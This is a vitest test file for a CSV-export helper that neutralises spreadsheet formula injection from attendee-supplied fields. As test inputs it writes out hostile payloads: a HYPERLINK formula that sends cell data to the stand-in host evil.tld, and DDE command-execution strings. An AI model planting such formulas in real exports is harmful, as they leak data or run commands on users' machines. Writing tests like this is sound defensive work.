/**
 * escapeCsvCell — formula-injection neutralization (review H2).
 * The attack: attendee-controlled fields (name/org/bio/tags…) flow into CSV
 * exports; a leading =, +, -, @, tab or CR makes spreadsheet apps evaluate
 * the cell. These pin the neutralization AND the phone-number exemption.
 */
import { describe, it, expect } from "vitest";
import { escapeCsvCell, toCsvRow, toCsv } from "@/lib/csv-escape";

describe("escapeCsvCell — formula neutralization", () => {
  it("neutralizes a leading = (HYPERLINK exfiltration)", () => {
    expect(escapeCsvCell('=HYPERLINK("https://evil.tld/?"&C2,"click")')).toBe(
      "\"'=HYPERLINK(\"\"https://evil.tld/?\"\"&C2,\"\"click\"\")\"",
    );
  });

  it("neutralizes a DDE payload", () => {
    expect(escapeCsvCell("=cmd|'/c calc'!A1")).toBe("'=cmd|'/c calc'!A1");
  });

  it("neutralizes leading @ (Lotus-style functions)", () => {
    expect(escapeCsvCell("@SUM(1+9)")).toBe("'@SUM(1+9)");
  });

  it("neutralizes leading + and - when not number-shaped", () => {
    expect(escapeCsvCell("+cmd|' /C calc'!A0")).toBe("'+cmd|' /C calc'!A0");
    expect(escapeCsvCell("-2+3+cmd|' /C calc'!A0")).toBe("'-2+3+cmd|' /C calc'!A0");
  });

  it("neutralizes leading tab and CR", () => {
    // Tab needs no RFC 4180 quoting (not a delimiter); CR does.
    expect(escapeCsvCell("\t=1+1")).toBe("'\t=1+1");
    expect(escapeCsvCell("\r=1+1")).toBe('"\'\r=1+1"');
  });

  it("leaves phone numbers untouched (the + exemption)", () => {
    expect(escapeCsvCell("+971 4 555 0123")).toBe("+971 4 555 0123");
    expect(escapeCsvCell("+1-555-0123")).toBe("+1-555-0123");
    expect(escapeCsvCell("-555 (0123)")).toBe("-555 (0123)");
  });

  it("keeps ordinary values byte-identical", () => {
    expect(escapeCsvCell("Dr. Jane Doe")).toBe("Dr. Jane Doe");
    expect(escapeCsvCell("Physician")).toBe("Physician");
    expect(escapeCsvCell(42)).toBe("42");
  });

  it("quotes commas, quotes and newlines per RFC 4180", () => {
    expect(escapeCsvCell("Acme, Inc.")).toBe('"Acme, Inc."');
    expect(escapeCsvCell('say "hi"')).toBe('"say ""hi"""');
    expect(escapeCsvCell("line1\nline2")).toBe('"line1\nline2"');
  });

  it("renders null/undefined as empty", () => {
    expect(escapeCsvCell(null)).toBe("");
    expect(escapeCsvCell(undefined)).toBe("");
  });

  it("quotes a neutralized cell that also contains a comma", () => {
    expect(escapeCsvCell("=1,2")).toBe("\"'=1,2\"");
  });
});

describe("row/document builders", () => {
  it("toCsvRow escapes every cell", () => {
    expect(toCsvRow(["a", "=b", "c,d"])).toBe("a,'=b,\"c,d\"");
  });

  it("toCsv joins rows with the requested EOL", () => {
    expect(toCsv([["h1", "h2"], ["=x", "y"]], "\r\n")).toBe("h1,h2\r\n'=x,y");
  });
});
